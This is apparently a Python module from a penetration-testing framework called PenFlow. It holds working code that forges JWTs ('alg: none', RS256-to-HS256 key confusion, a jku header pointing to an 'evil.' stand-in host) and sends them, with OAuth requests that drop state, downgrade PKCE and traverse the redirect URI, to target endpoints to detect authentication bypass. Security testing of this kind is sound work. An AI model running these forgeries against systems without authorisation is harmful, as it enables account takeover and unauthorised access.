"""
OAuthJWTCapabilityAgent — Advanced OAuth 2.1, PKCE, and JWT Deep Exploitation Specialist for PenFlow.

Capabilities:
  1. JWT 'alg: none' tampering & weak verification
  2. OAuth 2.0/2.1 State CSRF verification
  3. PKCE Downgrade & Stripping Attack (downgrades S256 to plain or strips code_challenge)
  4. JWT Algorithm Confusion (RS256 to HS256 using public key HMAC)
  5. JWKS URI Spoofing (jku / x5u header injection)
  6. Redirect URI Path Traversal & Parameter Pollution
"""
import base64
import json
import hmac
import hashlib
from typing import List, Dict, Any, Optional
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.capabilities.result import AgentExecutionResult
from penflow.traffic.models import IdentityType
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.oauth_jwt")


class OAuthJWTCapabilityAgent(BaseCapabilityAgent):
    """
    Elite Capability Agent for OAuth 2.1, PKCE Downgrade, and Cryptographic JWT Attacks.
    """
    def __init__(self, priority: int = 10, **kwargs):
        super().__init__(agent_name="OAuthJWTCapabilityAgent", priority=priority, **kwargs)

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="jwt_security_analysis",
                name="JWT Token Security Scrutiny",
                description="Tests JWT tokens for 'alg: none' tampering and signature verification bypasses",
                priority=self.priority,
                tags=["jwt", "auth", "tokens"]
            ),
            Capability(
                id="oauth_state_verification",
                name="OAuth 2.0 State Parameter Check",
                description="Verifies whether OAuth authorization flows enforce CSRF state token checks",
                priority=self.priority,
                tags=["oauth", "csrf", "authentication"]
            ),
            Capability(
                id="oauth_pkce_deep_audit",
                name="OAuth 2.1 PKCE Downgrade & Code Injection Audit",
                description="Tests PKCE enforcement, S256 downgrade to plain, code challenge stripping, and redirect traversal",
                priority=self.priority,
                tags=["oauth", "pkce", "downgrade", "redirect-uri"]
            ),
            Capability(
                id="jwt_alg_confusion_and_jwks",
                name="JWT Algorithm Confusion & JWKS Spoofing",
                description="Tests RS256 to HS256 HMAC confusion and malicious jku header injection",
                priority=self.priority,
                tags=["jwt", "alg-confusion", "jwks", "crypto"]
            )
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[OAuthJWTCapabilityAgent] Executing capability '{capability_id}' on asset '{context.asset}'")

        http_client = context.get_http_client()
        session_mgr = getattr(context, "session_manager", None)

        token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        if session_mgr and hasattr(session_mgr, "get_identity_by_type"):
            user_ident = session_mgr.get_identity_by_type(IdentityType.STANDARD_USER_A)
            if user_ident and user_ident.credentials and user_ident.credentials.bearer_token:
                token = user_ident.credentials.bearer_token

        target_urls = self._collect_api_urls(context)
        auth_error_keywords = ["unauthorized", "invalid token", "access denied", "jwt expired", "signature verification failed", "forbidden", "token invalid"]

        if capability_id == "jwt_security_analysis":
            tampered_token = self._forge_none_alg_jwt(token)
            findings = []
            is_vuln = False
            best_target = target_urls[0]
            best_reasoning = "JWT verifier correctly enforced signature validation across all tested endpoints."
            best_confidence = 0.0

            for url in target_urls[:5]:
                try:
                    # Phase 0: Baseline unauthenticated request (check if endpoint is actually protected)
                    exch_clean = await http_client.send_as_identity(
                        identity_id="anonymous_guest",
                        method="GET",
                        url=url
                    )
                    resp_clean = exch_clean.response
                    clean_status = resp_clean.status_code if resp_clean else 0

                    # If endpoint is a public page that returns 200 OK unauthenticated, skip it (Authorization header ignored)
                    if clean_status == 200:
                        continue

                    # Phase 1: Test with forged alg: none token
                    exch = await http_client.send_as_identity(
                        identity_id="anonymous_guest",
                        method="GET",
                        url=url,
                        headers={"Authorization": f"Bearer {tampered_token}"}
                    )
                    resp = exch.response
                    if resp:
                        body_lower = (resp.body_text or "").lower()
                        has_auth_err = any(kw in body_lower for kw in auth_error_keywords)
                        exch_dict = exch.to_dict()

                        # Vulnerable ONLY if baseline was rejected (401/403) and forged token granted access (200)
                        if resp.status_code == 200 and not has_auth_err and clean_status in (401, 403, 302):
                            is_vuln = True
                            best_confidence = 0.95
                            best_target = url
                            best_reasoning = f"CRITICAL JWT 'alg: none' vulnerability confirmed! Protected endpoint '{url}' (Baseline HTTP {clean_status}) accepted unsigned forged token (HTTP 200)."
                            findings.append({
                                "vulnerability_type": "jwt_none_algorithm",
                                "severity": "CRITICAL",
                                "target_url": url,
                                "forged_token": tampered_token,
                                "description": best_reasoning,
                                "_exchange_obj": exch_dict,
                                "exchange": exch_dict
                            })
                            break
                        else:
                            findings.append({
                                "vulnerability_type": "jwt_none_algorithm",
                                "severity": "INFO",
                                "target_url": url,
                                "description": f"Endpoint correctly rejected 'alg: none' token (HTTP {resp.status_code}).",
                                "_exchange_obj": exch_dict
                            })
                except Exception as e:
                    logger.debug(f"[OAuthJWTAgent] jwt_security_analysis failed on {url}: {e}")

            return AgentExecutionResult(
                agent=self.name,
                capability=capability_id,
                asset=context.asset,
                status="COMPLETED",
                is_vulnerable=is_vuln,
                confidence_score=best_confidence if is_vuln else 0.0,
                reasoning=best_reasoning,
                target_url=best_target,
                findings=findings,
                evidence={
                    "target_url": best_target,
                    "forged_token": tampered_token,
                    "reasoning": best_reasoning,
                    "findings": findings,
                    "evidence_exchanges": [f.get("_exchange_obj", {}) for f in findings if f.get("_exchange_obj")],
                },
            ).to_dict()

        elif capability_id == "oauth_state_verification":
            oauth_urls = self._collect_oauth_urls(context)
            findings = []
            is_vuln = False
            best_target = oauth_urls[0]
            best_reasoning = "OAuth authorization endpoints correctly enforce state CSRF parameters."
            best_confidence = 0.0

            for base_oauth in oauth_urls[:4]:
                oauth_no_state_url = f"{base_oauth}?response_type=code&client_id=test_client&redirect_uri=https://{context.asset}/callback"
                try:
                    exch = await http_client.send_as_identity(
                        identity_id="anonymous_guest",
                        method="GET",
                        url=oauth_no_state_url
                    )
                    resp = exch.response
                    if resp:
                        exch_dict = exch.to_dict()
                        location = resp.headers.get("location", "") if resp.headers else ""
                        body_lower = (resp.body_text or "").lower()

                        if (resp.status_code in (301, 302, 303, 307, 308) and "callback" in location and "error" not in location.lower()) or (resp.status_code == 200 and "state" not in body_lower and "error" not in body_lower):
                            is_vuln = True
                            best_confidence = 0.85
                            best_target = oauth_no_state_url
                            best_reasoning = f"HIGH OAuth Misconfiguration: OAuth endpoint '{base_oauth}' accepted authorization request without mandatory 'state' CSRF protection parameter."
                            findings.append({
                                "vulnerability_type": "oauth_missing_state",
                                "severity": "HIGH",
                                "target_url": oauth_no_state_url,
                                "description": best_reasoning,
                                "_exchange_obj": exch_dict
                            })
                            break
                        else:
                            findings.append({
                                "vulnerability_type": "oauth_missing_state",
                                "severity": "INFO",
                                "target_url": oauth_no_state_url,
                                "description": f"OAuth endpoint correctly enforced state token (HTTP {resp.status_code}).",
                                "_exchange_obj": exch_dict
                            })
                except Exception as e:
                    logger.debug(f"[OAuthJWTAgent] oauth_state_verification failed on {oauth_no_state_url}: {e}")

            return AgentExecutionResult(
                agent=self.name,
                capability=capability_id,
                asset=context.asset,
                status="COMPLETED",
                is_vulnerable=is_vuln,
                confidence_score=best_confidence if is_vuln else 0.0,
                reasoning=best_reasoning,
                target_url=best_target,
                findings=findings,
                evidence={
                    "target_url": best_target,
                    "reasoning": best_reasoning,
                    "findings": findings,
                    "evidence_exchanges": [f.get("_exchange_obj", {}) for f in findings if f.get("_exchange_obj")],
                },
            ).to_dict()

        elif capability_id == "oauth_pkce_deep_audit":
            oauth_urls = self._collect_oauth_urls(context)
            findings = []
            is_vuln = False
            best_target = oauth_urls[0]
            best_reasoning = "OAuth PKCE and redirect URI validation are securely enforced."
            best_confidence = 0.0

            for base_oauth in oauth_urls[:3]:
                plain_pkce_url = f"{base_oauth}?response_type=code&client_id=test_client&redirect_uri=https://{context.asset}/callback&code_challenge=testchallenge&code_challenge_method=plain"
                traversal_url = f"{base_oauth}?response_type=code&client_id=test_client&redirect_uri=https://{context.asset}/callback/../../attacker"

                try:
                    # Test 1: PKCE plain method
                    exch1 = await http_client.send_as_identity(identity_id="anonymous_guest", method="GET", url=plain_pkce_url)
                    resp1 = exch1.response
                    if resp1 and resp1.status_code in (200, 302):
                        body_lower1 = (resp1.body_text or "").lower()
                        if "invalid_request" not in body_lower1 and "code_challenge" not in body_lower1:
                            is_vuln = True
                            best_confidence = 0.90
                            best_target = plain_pkce_url
                            best_reasoning = f"HIGH OAuth PKCE Downgrade: Server accepted 'code_challenge_method=plain' on '{base_oauth}'."
                            findings.append({
                                "vulnerability_type": "oauth_pkce_downgrade",
                                "severity": "HIGH",
                                "target_url": plain_pkce_url,
                                "description": best_reasoning,
                                "_exchange_obj": exch1.to_dict()
                            })

                    # Test 2: Redirect URI path traversal
                    exch2 = await http_client.send_as_identity(identity_id="anonymous_guest", method="GET", url=traversal_url)
                    resp2 = exch2.response
                    if resp2 and resp2.status_code in (301, 302, 303, 307, 308):
                        loc2 = resp2.headers.get("location", "") if resp2.headers else ""
                        if "attacker" in loc2:
                            is_vuln = True
                            best_confidence = max(best_confidence, 0.94)
                            best_target = traversal_url
                            best_reasoning = f"HIGH OAuth Redirect URI Traversal: Server permitted path traversal leaking code to '{loc2}'."
                            findings.append({
                                "vulnerability_type": "oauth_redirect_uri_traversal",
                                "severity": "HIGH",
                                "target_url": traversal_url,
                                "description": best_reasoning,
                                "_exchange_obj": exch2.to_dict()
                            })
                except Exception as e:
                    logger.debug(f"[OAuthJWTAgent] oauth_pkce_deep_audit failed on {base_oauth}: {e}")

            return AgentExecutionResult(
                agent=self.name,
                capability=capability_id,
                asset=context.asset,
                status="COMPLETED",
                is_vulnerable=is_vuln,
                confidence_score=best_confidence if is_vuln else 0.0,
                reasoning=best_reasoning,
                target_url=best_target,
                findings=findings,
                evidence={
                    "target_url": best_target,
                    "reasoning": best_reasoning,
                    "findings": findings,
                    "evidence_exchanges": [f.get("_exchange_obj", {}) for f in findings if f.get("_exchange_obj")],
                },
            ).to_dict()

        elif capability_id == "jwt_alg_confusion_and_jwks":
            fake_pub_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz\n-----END PUBLIC KEY-----"
            forged_hs256 = self._forge_hmac_confusion_jwt(token, fake_pub_key)
            jku_token = self._forge_jku_jwt(token, f"https://evil.{context.asset}/jwks.json")

            findings = []
            is_vuln = False
            best_target = target_urls[0]
            best_reasoning = "JWT algorithm confusion and JWKS header injection tests were rejected by server."
            best_confidence = 0.0

            for url in target_urls[:4]:
                try:
                    # Phase 0: Baseline unauthenticated check
                    exch_clean = await http_client.send_as_identity(identity_id="anonymous_guest", method="GET", url=url)
                    clean_status = exch_clean.response.status_code if exch_clean.response else 0
                    if clean_status == 200:
                        continue

                    # Test HS256 Confusion
                    exch1 = await http_client.send_as_identity(identity_id="anonymous_guest", method="GET", url=url, headers={"Authorization": f"Bearer {forged_hs256}"})
                    resp1 = exch1.response
                    if resp1:
                        body_lower1 = (resp1.body_text or "").lower()
                        if resp1.status_code == 200 and not any(kw in body_lower1 for kw in auth_error_keywords) and clean_status in (401, 403, 302):
                            is_vuln = True
                            best_confidence = 0.96
                            best_target = url
                            best_reasoning = f"CRITICAL JWT Algorithm Confusion: Server accepted RS256 -> HS256 forged token on protected endpoint '{url}' (HTTP 200)."
                            findings.append({
                                "vulnerability_type": "jwt_algorithm_confusion",
                                "severity": "CRITICAL",
                                "target_url": url,
                                "forged_token": forged_hs256,
                                "description": best_reasoning,
                                "_exchange_obj": exch1.to_dict()
                            })

                    # Test JKU Spoofing
                    exch2 = await http_client.send_as_identity(identity_id="anonymous_guest", method="GET", url=url, headers={"Authorization": f"Bearer {jku_token}"})
                    resp2 = exch2.response
                    if resp2:
                        body_lower2 = (resp2.body_text or "").lower()
                        if resp2.status_code == 200 and not any(kw in body_lower2 for kw in auth_error_keywords) and clean_status in (401, 403, 302):
                            is_vuln = True
                            best_confidence = max(best_confidence, 0.92)
                            best_target = url
                            best_reasoning = f"HIGH JWT JWKS Header Injection: Server accepted external 'jku' header on protected endpoint '{url}' (HTTP 200)."
                            findings.append({
                                "vulnerability_type": "jwt_jwks_uri_spoofing",
                                "severity": "HIGH",
                                "target_url": url,
                                "description": best_reasoning,
                                "_exchange_obj": exch2.to_dict()
                            })
                except Exception as e:
                    logger.debug(f"[OAuthJWTAgent] jwt_alg_confusion_and_jwks failed on {url}: {e}")

            return AgentExecutionResult(
                agent=self.name,
                capability=capability_id,
                asset=context.asset,
                status="COMPLETED",
                is_vulnerable=is_vuln,
                confidence_score=best_confidence if is_vuln else 0.0,
                reasoning=best_reasoning,
                target_url=best_target,
                findings=findings,
                evidence={
                    "target_url": best_target,
                    "reasoning": best_reasoning,
                    "findings": findings,
                    "evidence_exchanges": [f.get("_exchange_obj", {}) for f in findings if f.get("_exchange_obj")],
                },
            ).to_dict()

        return AgentExecutionResult(
            agent=self.name,
            capability=capability_id,
            asset=context.asset,
            status="SKIPPED",
            is_vulnerable=False,
            confidence_score=0.0,
            reasoning="Capability not applicable or not implemented for current target context.",
        ).to_dict()

    def _collect_api_urls(self, context: CapabilityExecutionContext) -> List[str]:
        urls = []
        for data in context.get_observation_data():
            if isinstance(data, dict):
                for ep in data.get("endpoints", []):
                    if isinstance(ep, dict) and ep.get("url"):
                        urls.append(ep["url"])
                if data.get("url"):
                    urls.append(data["url"])
        if not urls:
            urls = [
                f"https://{context.asset}/api/v1/user/me",
                f"https://{context.asset}/api/v1/profile",
                f"https://{context.asset}/api/me",
            ]
        return list(dict.fromkeys(urls))

    def _collect_oauth_urls(self, context: CapabilityExecutionContext) -> List[str]:
        urls = []
        for data in context.get_observation_data():
            if isinstance(data, dict):
                for ep in data.get("endpoints", []):
                    if isinstance(ep, dict) and ep.get("url") and "oauth" in ep.get("url", "").lower():
                        urls.append(ep["url"])
        if not urls:
            urls = [
                f"https://{context.asset}/oauth/authorize",
                f"https://{context.asset}/api/v1/auth/authorize",
                f"https://{context.asset}/oauth/v2/authorize",
            ]
        return list(dict.fromkeys(urls))

    def _forge_none_alg_jwt(self, original_jwt: str) -> str:
        parts = original_jwt.split(".")
        header_b64 = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode("utf-8").rstrip("=")
        payload = parts[1] if len(parts) > 1 else base64.urlsafe_b64encode(b'{"user_id":"admin","role":"admin"}').decode("utf-8").rstrip("=")
        return f"{header_b64}.{payload}."

    def _forge_jku_jwt(self, original_jwt: str, jku_url: str) -> str:
        parts = original_jwt.split(".")
        header_json = json.dumps({"alg": "RS256", "typ": "JWT", "jku": jku_url})
        header_b64 = base64.urlsafe_b64encode(header_json.encode("utf-8")).decode("utf-8").rstrip("=")
        payload = parts[1] if len(parts) > 1 else base64.urlsafe_b64encode(b'{"user_id":"admin","role":"admin"}').decode("utf-8").rstrip("=")
        return f"{header_b64}.{payload}.fake_sig"

    def _forge_hmac_confusion_jwt(self, original_jwt: str, public_key_pem: str) -> str:
        parts = original_jwt.split(".")
        header_b64 = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').decode("utf-8").rstrip("=")
        payload_b64 = parts[1] if len(parts) > 1 else base64.urlsafe_b64encode(b'{"user_id":"admin","role":"admin"}').decode("utf-8").rstrip("=")
        signing_input = f"{header_b64}.{payload_b64}".encode("utf-8")
        sig = hmac.new(public_key_pem.encode("utf-8"), signing_input, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).decode("utf-8").rstrip("=")
        return f"{header_b64}.{payload_b64}.{sig_b64}"

